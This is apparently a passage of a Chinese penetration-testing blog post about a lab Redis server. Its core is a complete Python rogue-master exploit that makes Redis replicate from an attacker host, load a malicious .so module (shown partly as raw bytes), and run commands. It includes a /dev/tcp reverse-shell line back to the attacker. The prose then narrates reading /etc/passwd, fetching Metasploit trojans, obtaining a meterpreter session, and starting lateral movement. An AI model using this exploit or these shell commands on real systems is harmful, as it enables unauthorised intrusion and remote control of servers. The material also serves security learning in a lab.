\xd2\x1e\x04\x06\x13\xf6~\xc1\x9b\x17\x83\xa9\x11\xa1\xef\xf2\xe86\xe7\xe1%\x0b\xddj&lt;\\i\xc4\x18\xe6\x86\xb1\xcf\r\xe7b\x18\xb8\xdd`\xc2\xb0\xf8\x86\x90\xbe67\xcaI\xb2y\x85\xd1\x94c\xe1&#125;%\xd9\x0f\xde\xb8\xb2#\x87\xfc\x96O&#123;\xeb\x1c5\xa5\x932\r7\xac\x97\xeeI`\xb0\xa7\x06\x9b+\x18F\x93\xces\n\x9f\xac\x88\xbb\xd5G\x1e\xbc#Mr0\x8c\xdd\xae&#123;\xe9\xafM]3\xce\xc9`\x0b\x01\xd9\xbe\x1a\xf2\x89Z\xc6\xfbr\xc8\xb7\x960\xde6\xe6\x1cA\xd7\xc3j\x93\xdc!a\x94\xf7\xc0 \x19\xe1\xa6.\x9bC.\rY\xffK6\xd2\x880\x9d\xdd8\xf4\xbbn\x12\xa2\xe1\xd6\x0f\xd2\x17\xd2\xe7\xd8\xb0(\xc2v\x11\xfa\xc7\xfeH\xf3\x97\rf\xcdD\xd83E\xba\xa3\x88\xe1D\x03\xc3\xadj\xa4+\x16\xb4\xb9\xb1\xc6\xf5j\xbc\xc1\x13\x99\xd0\xaed\xfbW\xd6\x06\x9cep\x0e\xf8\xb4s5\xbb\xaa\xf2\x04\xb3\xab\xe1\xa9K\xc9\xaeX\xe9\x016\xed\x0c\x8f\xdc\x04a\xb3YB\x13\x0e\xc0|\xae\x1agv]M@\xc9\xc6\xdb=\xa4\xbd\xe4\xf9&lt;\xdbU\xed\xa8\xf4\xe1\x94\x11\xd4\xe2\xacu\x97\x83\xa47\xa0q\xc2p\xaed\x97Cw\xc7v\x94]\xe1*\x0bV9\x9c&gt;,\x9f\x9f%\xdd\x9eJ/\x87\xca\xca\xb0\xab\xd0\x14\x0cg.v\x8d\xd6\xfd\x1b&gt;&#125;\x15-\x061\x8b\xff\xcb\xde\x8b\xb33Y1\xadt\xc6\x19\xe6\xef\x8d\xe8\x19\x17\xa8~\xdf\xd1\xe1e\xf2\xec\xfd9;\xf72\x90g\x1f|\x1d\x1e\x1f\x92?&#123;\xcf\xce\xce&#123;\x12;\xf3SC\xe4Y\xfc\xe3\xe1T7\x93g\xef\xe3\xd9\x99\xc5Mf\x1f\xf1\xb5\xff\xf9\x8a\x16\xe3\x98\xc9\xb3\xf7\xf6\xec\x9c\xa9\x86\xdbo\x12\xce\xb8|\xf2\xe7\x10y\xf6~\x9f\x9ds\x14\xb9\xfd\xecs1\xc5&amp;\xd14\x9b\x07\xc0\xce\xd5!\xf9\&#x27;*\xfa\xf2\xcf\xa7zY\xdch6_\x80\xcf\x1b\x10\nl\x13\xce\x97\x8a\xf2Y\xe1g1X\xb1\xe8?\&#x27;\xa5\xb1\xf2\xb3\xf9\x07\xec| !\x9c_,\xbf[\x90g\xf3\x14\xd8\xf9E\x81_\x94\xf7S\xdbY\xfd\xb0\xf7\xf5\x8d\xb3\xb5\xf4\x12j0k\xafL\x9e\x95\xff*\x9a\xbf\x18G[)\xd6N\xdb\x0c\xf2g\xe7\xf5\xf4\x9a\xc9\xb3\xdf\xe3\xb7Q\xf96\xaeXn\xfff\x9a\x7f\x8e@g\xf2C\x05\xba*\x9cw(\xfa:\xc1\xcf\xd3T^\xd4+\xf2\xdei \xff\x05\x95\xff\xaeO8]\xe4&#125;\xc8@\xbe\xcd\xab\x9d\&#x27;\x9a\xc2\xe9&quot;\xef3\x06\xf2&#125;\xe9\xe8\xd6]\xf0\x9f\xc8&#123;H\x91\xfb/7\xa8\x9d\xcf\x18\xb4\xdf\xd0\xb3`\xa2&amp;\xbfQ;[hC\xc1\xc8#=\x14&#125;\xff\xc3aJ0\x91|\xf2vigkR8]\xb4\xbf\x8b\x81\xfc\xf4&#123;\xb4\xf3a\x81.\xca\xff/d*\x95\xef&#x27;</span>)</span><br><span class="line">CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">finish = <span class="literal">False</span></span><br><span class="line">commandStatus = <span class="literal">False</span></span><br><span class="line">messageList = &#123;</span><br><span class="line">    <span class="string">&quot;get&quot;</span>:[],</span><br><span class="line">    <span class="string">&quot;send&quot;</span>:[]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_Run</span>(<span class="params">Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,host:<span class="built_in">str</span></span>):</span></span><br><span class="line">        Thread.__init__(self)</span><br><span class="line">        self.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        host_list = host.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        self.connectHost = (host_list[<span class="number">0</span>],<span class="built_in">int</span>(host_list[<span class="number">1</span>]))</span><br><span class="line">        self.ths = [Thread(target=self.get),Thread(target=self.send)]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">        self.s.setsockopt(SOL_SOCKET, SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        self.s.connect(self.connectHost)</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> self.ths:</span><br><span class="line">            each.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> self.ths:</span><br><span class="line">            each.start()</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> finish:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(messageList[<span class="string">&#x27;get&#x27;</span>]) &gt; <span class="number">0</span> <span class="keyword">and</span> commandStatus:</span><br><span class="line">                result = messageList[<span class="string">&#x27;get&#x27;</span>].pop(<span class="number">0</span>).decode().split(<span class="string">&quot;\r\n&quot;</span>)[<span class="number">2</span>].strip()</span><br><span class="line">                <span class="keyword">if</span> result:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;*&quot;</span>*<span class="number">10</span> +<span class="string">&quot; &lt; result &gt; &quot;</span> + <span class="string">&quot;*&quot;</span>*<span class="number">10</span> +  <span class="string">f&quot;\n<span class="subst">&#123;result&#125;</span>\n&quot;</span> + <span class="string">&quot;*&quot;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">global</span> messageList</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> finish:</span><br><span class="line">            data = self.s.recv(<span class="number">65535</span>)</span><br><span class="line">            <span class="keyword">if</span> data <span class="keyword">and</span> commandStatus:</span><br><span class="line">                messageList[<span class="string">&#x27;get&#x27;</span>].append(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">global</span> messageList</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> finish:</span><br><span class="line">            self.s.send(messageList[<span class="string">&#x27;send&#x27;</span>].pop(<span class="number">0</span>)) <span class="keyword">if</span> <span class="built_in">len</span>(messageList[<span class="string">&#x27;send&#x27;</span>]) &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">FD = <span class="literal">None</span></span><br><span class="line">OLD_SETTINGS = <span class="literal">None</span></span><br><span class="line">CONN_ONLINE = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_shell</span>(<span class="params">port:<span class="built_in">int</span>=<span class="number">4444</span>,payload:<span class="built_in">bytes</span>=<span class="string">b&quot;&quot;</span></span>):</span></span><br><span class="line">    <span class="keyword">from</span> termios <span class="keyword">import</span> tcgetattr, tcsetattr, TCSADRAIN</span><br><span class="line">    <span class="keyword">from</span> os <span class="keyword">import</span> system, _exit</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> stdin, stdout</span><br><span class="line">    <span class="keyword">import</span> _thread <span class="keyword">as</span> thread</span><br><span class="line">    <span class="keyword">from</span> tty <span class="keyword">import</span> setraw</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_byte</span>(<span class="params">s, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(s, encoding=encoding)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_GetchUnix</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">global</span> FD, OLD_SETTINGS</span><br><span class="line">            FD = stdin.fileno()</span><br><span class="line">            OLD_SETTINGS = tcgetattr(FD)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                setraw(stdin.fileno())</span><br><span class="line">                ch = stdin.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                tcsetattr(FD, TCSADRAIN, OLD_SETTINGS)</span><br><span class="line">            <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line">    STDOUT = stdout.buffer</span><br><span class="line">    getch = _GetchUnix()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_stdprint</span>(<span class="params">message</span>):</span></span><br><span class="line">        stdout.write(message)</span><br><span class="line">        stdout.flush()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_close_socket</span>(<span class="params">talk, exit_code=<span class="number">0</span></span>):</span></span><br><span class="line">        <span class="keyword">global</span> FD, OLD_SETTINGS, CONN_ONLINE</span><br><span class="line">        CONN_ONLINE = <span class="number">0</span></span><br><span class="line">        talk.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            tcsetattr(FD, TCSADRAIN, OLD_SETTINGS)</span><br><span class="line">        <span class="keyword">except</span> TypeError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        system(<span class="string">&quot;reset&quot;</span>)</span><br><span class="line">        _exit(exit_code)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recv_daemon</span>(<span class="params">conn</span>):</span></span><br><span class="line">        <span class="keyword">global</span> CONN_ONLINE</span><br><span class="line">        <span class="keyword">while</span> CONN_ONLINE:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                tmp = conn.recv(<span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> (tmp):</span><br><span class="line">                    STDOUT.write(tmp)</span><br><span class="line">                    stdout.flush()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> error</span><br><span class="line">            <span class="keyword">except</span> error:</span><br><span class="line">                msg = <span class="string">&quot;Connection close by socket.\n&quot;</span></span><br><span class="line">                _stdprint(msg)</span><br><span class="line">                _close_socket(conn, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_main</span>(<span class="params">port</span>):</span></span><br><span class="line">        <span class="keyword">global</span> messageList</span><br><span class="line"></span><br><span class="line">        conn = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">        conn.setsockopt(SOL_SOCKET, SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        conn.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, port))</span><br><span class="line">        conn.listen(<span class="number">1</span>)</span><br><span class="line">        messageList[<span class="string">&quot;send&quot;</span>].append(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            talk, addr = conn.accept()</span><br><span class="line">            _stdprint(<span class="string">&quot;Connect from %s.\n&quot;</span> % addr[<span class="number">0</span>])</span><br><span class="line">            thread.start_new_thread(_recv_daemon, (talk,))</span><br><span class="line">            talk.send(_get_byte(<span class="string">&quot;&quot;&quot;python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;\n&quot;&quot;&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            talk.send(_get_byte(<span class="string">&quot;&quot;&quot;clear\n&quot;&quot;&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">while</span> CONN_ONLINE:</span><br><span class="line">                c = getch()</span><br><span class="line">                <span class="keyword">if</span> c:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        talk.send(_get_byte(c, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                    <span class="keyword">except</span> error:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment"># stdprint(&quot;Connection close by KeyboardInterrupt.\n&quot;)</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            _stdprint(<span class="string">&quot;Connection close...\n&quot;</span>)</span><br><span class="line">            _close_socket(conn, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    _main(port = port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_shell</span>(<span class="params">host: <span class="built_in">str</span>, masterHost: <span class="built_in">str</span> = <span class="string">&quot;127.0.0.1:2020&quot;</span>, authPass: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>,expFileName: <span class="built_in">str</span> = <span class="string">&quot;mor.so&quot;</span>, command=<span class="string">&quot;id&quot;</span>,  interactive: <span class="built_in">bool</span> = <span class="literal">False</span>, reshell:<span class="built_in">dict</span>=&#123;&#125;</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> finish,commandStatus,messageList</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_redis_format</span>(<span class="params">*redis_cmd</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(redis_cmd) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        cmd = <span class="string">f&quot;*<span class="subst">&#123;<span class="built_in">len</span>(redis_cmd)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> redis_cmd:</span><br><span class="line">            cmd += <span class="string">f&quot;<span class="subst">&#123;CRLF&#125;</span>$<span class="subst">&#123;<span class="built_in">len</span>(line)&#125;</span><span class="subst">&#123;CRLF&#125;</span><span class="subst">&#123;line&#125;</span>&quot;</span></span><br><span class="line">        cmd += CRLF</span><br><span class="line">        <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_wait_for</span>():</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(messageList[<span class="string">&quot;send&quot;</span>]) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_RogueServer</span>(<span class="params">ip, port</span>):</span></span><br><span class="line"></span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">        s.setsockopt(SOL_SOCKET, SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        s.bind((ip, port))</span><br><span class="line">        s.listen(<span class="number">10</span>)</span><br><span class="line">        client, _ = s.accept()</span><br><span class="line">        <span class="keyword">while</span> flag:</span><br><span class="line">            getData = client.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;PING&quot;</span> <span class="keyword">in</span> getData:</span><br><span class="line">                client.send(<span class="string">b&quot;+PING\r\n&quot;</span>)</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">b&quot;REPLCONF&quot;</span> <span class="keyword">in</span> getData:</span><br><span class="line">                client.send(<span class="string">b&quot;+OK\r\n&quot;</span>)</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">b&quot;PSYNC&quot;</span> <span class="keyword">in</span> getData <span class="keyword">or</span> <span class="string">b&quot;SYNC&quot;</span> <span class="keyword">in</span> getData:</span><br><span class="line">                client.send(<span class="string">b&quot;+FULLRESYNC &quot;</span> + <span class="string">b&quot;sycv5&quot;</span> * <span class="number">8</span> + <span class="string">b&quot; 1\r\n&quot;</span> + <span class="string">b&quot;$&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    <span class="built_in">len</span>(exp)).encode() + <span class="string">b&quot;\r\n&quot;</span> + exp + <span class="string">b&quot;\r\n&quot;</span>)</span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    _Run(host = host).start()</span><br><span class="line"></span><br><span class="line">    payload = [</span><br><span class="line">        [<span class="string">&quot;auth&quot;</span>, <span class="string">f&#x27;<span class="subst">&#123;authPass&#125;</span>&#x27;</span>] <span class="keyword">if</span> authPass <span class="keyword">else</span> [],</span><br><span class="line">        [<span class="string">&quot;flushall&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;slaveof&quot;</span>, <span class="string">&quot;no&quot;</span>, <span class="string">&quot;one&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;slaveof&quot;</span>, masterHost.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>], masterHost.split(<span class="string">&quot;:&quot;</span>)[-<span class="number">1</span>]],</span><br><span class="line">        [<span class="string">&quot;config&quot;</span>, <span class="string">&quot;set&quot;</span>, <span class="string">&quot;dbfilename&quot;</span>, <span class="string">f&#x27;<span class="subst">&#123;expFileName&#125;</span>&#x27;</span>],</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--- Ready slave ---&quot;</span>)</span><br><span class="line">    messageList[<span class="string">&quot;send&quot;</span>].append(<span class="string">&quot;&quot;</span>.join(_redis_format(*line) <span class="keyword">for</span> line <span class="keyword">in</span> payload).encode())</span><br><span class="line">    _wait_for()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--- Build server ---&quot;</span>)</span><br><span class="line">    masterHost_list = masterHost.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip, port = masterHost_list[<span class="number">0</span>], masterHost_list[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Listen on <span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>... &quot;</span>)</span><br><span class="line">    _RogueServer(ip=ip, port=<span class="built_in">int</span>(port))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--- Load module ---&quot;</span>)</span><br><span class="line">    payload = [</span><br><span class="line">        [<span class="string">&quot;auth&quot;</span>, <span class="string">f&#x27;<span class="subst">&#123;authPass&#125;</span>&#x27;</span>] <span class="keyword">if</span> authPass <span class="keyword">else</span> [],</span><br><span class="line">        [<span class="string">&quot;module&quot;</span>, <span class="string">&quot;load&quot;</span>, <span class="string">f&quot;./<span class="subst">&#123;expFileName&#125;</span>&quot;</span>]</span><br><span class="line">    ]</span><br><span class="line">    messageList[<span class="string">&quot;send&quot;</span>].append(<span class="string">&quot;&quot;</span>.join(_redis_format(*line) <span class="keyword">for</span> line <span class="keyword">in</span> payload).encode())</span><br><span class="line">    _wait_for()</span><br><span class="line"></span><br><span class="line">    commandStatus = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(reshell) &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">        command = reshell[<span class="string">&#x27;command&#x27;</span>]</span><br><span class="line">        report = reshell[<span class="string">&#x27;report&#x27;</span>]</span><br><span class="line">        payload = [</span><br><span class="line">            [<span class="string">&quot;auth&quot;</span>, <span class="string">f&#x27;<span class="subst">&#123;authPass&#125;</span>&#x27;</span>] <span class="keyword">if</span> authPass <span class="keyword">else</span> [],</span><br><span class="line">            [<span class="string">&quot;system.exec&quot;</span>, <span class="string">f&#x27;<span class="subst">&#123;command&#125;</span>&#x27;</span>]</span><br><span class="line">        ]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;--- Listen on <span class="subst">&#123;report&#125;</span>---&quot;</span>)</span><br><span class="line">        re_shell(port=report,payload=<span class="string">&quot;&quot;</span>.join(_redis_format(*line) <span class="keyword">for</span> line <span class="keyword">in</span> payload).encode())</span><br><span class="line">        finish = <span class="literal">True</span></span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> interactive:</span><br><span class="line">        payload = [</span><br><span class="line">            [<span class="string">&quot;auth&quot;</span>, <span class="string">f&#x27;<span class="subst">&#123;authPass&#125;</span>&#x27;</span>] <span class="keyword">if</span> authPass <span class="keyword">else</span> [],</span><br><span class="line">            [<span class="string">&quot;system.exec&quot;</span>, <span class="string">f&#x27;<span class="subst">&#123;command&#125;</span>&#x27;</span>]</span><br><span class="line">        ]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;--- Command <span class="subst">&#123;command&#125;</span> ---&quot;</span>)</span><br><span class="line">        messageList[<span class="string">&quot;send&quot;</span>].append(<span class="string">&quot;&quot;</span>.join(_redis_format(*line) <span class="keyword">for</span> line <span class="keyword">in</span> payload).encode())</span><br><span class="line">        _wait_for()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;--- exit ---&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> interactive:</span><br><span class="line">                command = <span class="built_in">input</span>(<span class="string">&quot;command:&gt; &quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> command == <span class="string">&quot;exit&quot;</span> <span class="keyword">or</span> command == <span class="string">&quot;quit&quot;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                payload = [</span><br><span class="line">                    [<span class="string">&quot;auth&quot;</span>, <span class="string">f&#x27;<span class="subst">&#123;authPass&#125;</span>&#x27;</span>] <span class="keyword">if</span> authPass <span class="keyword">else</span> [],</span><br><span class="line">                    [<span class="string">&quot;system.exec&quot;</span>, <span class="string">f&#x27;<span class="subst">&#123;command&#125;</span>&#x27;</span>]</span><br><span class="line">                ]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;--- Command <span class="subst">&#123;command&#125;</span> ---&quot;</span>)</span><br><span class="line">                messageList[<span class="string">&quot;send&quot;</span>].append(<span class="string">&quot;&quot;</span>.join(_redis_format(*line) <span class="keyword">for</span> line <span class="keyword">in</span> payload).encode())</span><br><span class="line">                _wait_for()</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--- exit ---&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;--- Error: <span class="subst">&#123;e&#125;</span> ---&quot;</span>)</span><br><span class="line"></span><br><span class="line">    finish = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @ host 目标地址</span></span><br><span class="line"><span class="string">        @ masterHost 主机地址</span></span><br><span class="line"><span class="string">        @ autPass redis认证密码</span></span><br><span class="line"><span class="string">        @ expFileName 写入的so文件名称</span></span><br><span class="line"><span class="string">        @ command 执行一次的命令(仅交互模式=False,reshell=&#123;&#125;时有用)</span></span><br><span class="line"><span class="string">        @ interactive 是否启动伪交互式shell</span></span><br><span class="line"><span class="string">        @ reshell 伪交互式反弹shell(若不为&#123;&#125;则使用，仅支持Linux)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    redis_shell(</span><br><span class="line">        host = <span class="string">&quot;192.168.111.142:6379&quot;</span>,</span><br><span class="line">        masterHost = <span class="string">&quot;192.168.111.133:2020&quot;</span>,</span><br><span class="line">        authPass = <span class="string">&quot;123456&quot;</span>,</span><br><span class="line">        expFileName = <span class="string">&quot;mor.so&quot;</span> ,</span><br><span class="line">        command = <span class="string">&quot;&quot;</span>,</span><br><span class="line">        interactive = <span class="literal">True</span>,</span><br><span class="line">        reshell = &#123;</span><br><span class="line">            <span class="string">&quot;command&quot;</span>:<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.111.133/3349 0&gt;&amp;1&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;report&quot;</span>:<span class="number">3349</span></span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+<p>行吧，话不多说，这里就直接弹一个 <strong>伪完整交互shell</strong> 了。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314215956.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314215956063"></p>
+<p>此时此刻，就拿到了shell了。</p>
+<h3 id="横向移动-权限提升">- 横向移动 &amp; 权限提升 -</h3>
+<p>虽然说现在确实是得到了一个shell，但 <strong>redis</strong> 用户的权限实在是太低了，低到就算是在 <strong>/tmp</strong> 目录搞事都不太行的。比如这里简单演示一下在 <strong>/tmp</strong> 目录搞点花样：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314221218.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314221218340"></p>
+<p>几乎啥事也干不了，那再看真正的上帝视角，在 <strong>/tmp</strong> 是有很多文件的：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314221257.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314221257391"></p>
+<p>不过 <strong>redis</strong> 也是可以写文件的，不过只能是在自己的 <strong>家目录</strong> 咯，这里直接 <code>cat /etc/passwd</code> ：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314221408.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314221408691"></p>
+<p>然后写几个文件：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314221524.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314221524793"></p>
+<p>但这实在是非常的鸡肋，基本没用啊。因为这个目录是只有 <strong>redis</strong> 用户自己可以进去读文件的，也就是自己写给自己看，没法进一步利用。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314221642.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314221641944"></p>
+<p>不过，既然能够写文件，那也就可以写 <strong>msf木马</strong> 啦。</p>
+<h4 id="msf-获取-metershell">- msf 获取 metershell -</h4>
+<p>这里生成一个简单的 <strong>msf木马</strong> ，然后开一下 <strong>http服务器</strong> 以便从靶机拉取 <strong>msf木马</strong> 。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314222052.png?x-oss-process=image/auto-orient,1/interlace,1" alt="img"></p>
+<p>然而，并没有成功：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314222326.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314222326820"></p>
+<p>emmm，或者试一下 <strong>正向shell</strong> 看看。当然除了用 <strong>python</strong> 用 <strong>php</strong> 也是可以简单起一个 <strong>http服务器</strong> 的。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314222606.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314222606428"></p>
+<p>然后试试攻击：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314222703.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314222702900"></p>
+<p>显然，这里是炸了，并没有成功。</p>
+<p>不过实际上 <strong>靶机</strong> 是存在 <strong>python</strong> 环境的，可以用 <strong>python</strong> 的 <strong>meterpretershell</strong> 尝试一下。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314223128.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314223128708"></p>
+<p>emmm，这里是成功拿到了 <strong>meterpretershell</strong> 了。可以尝试搜寻 <strong>提权建议</strong> 试试。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315103436.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315103436728"></p>
+<p>看起来是不太行了，那么可是尝试 <strong>横向移动</strong> 。</p>
+<h4 id="开启代理">- 开启代理 -</h4>
+<p>首先，可以简单看一下 <strong>靶机</strong> 当前的内网情况，显然有一个 <strong>172.16.243.0/24</strong> 段。</p>
